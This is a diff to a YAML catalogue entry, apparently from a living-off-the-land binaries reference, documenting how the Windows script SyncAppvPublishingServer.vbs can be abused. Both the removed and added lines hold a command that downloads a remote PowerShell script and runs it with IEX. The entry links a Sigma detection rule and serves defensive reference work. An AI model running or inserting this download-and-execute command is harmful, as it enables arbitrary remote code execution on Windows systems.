@@ -1,22 +1,22 @@
 ---
 Name: Syncappvpublishingserver.vbs
 Description: Script used related to app-v and publishing server
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
+  - Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
     Description: Inject PowerShell script code with the provided arguments
     Usecase: Use Powershell host invoked from vbs script
     Category: Execute
     Privileges: User
-    MitreID: T1216
-    OperatingSystem: Windows 10
+    MitreID: T1216.002
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: PowerShell
 Full_Path:
   - Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
-Code_Sample:
-  - Code:
 Detection:
-  - Sigma: https://github.com/SigmaHQ/sigma/blob/973e0666acffb8fd7ea8356449eb916381ab0cc6/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml
 Resources:
   - Link: https://twitter.com/monoxgas/status/895045566090010624
   - Link: https://twitter.com/subTee/status/855738126882316288
@@ -25,4 +25,3 @@ Acknowledgement:
     Handle: '@monoxgas'
   - Person: Casey Smith
     Handle: '@subtee'
----
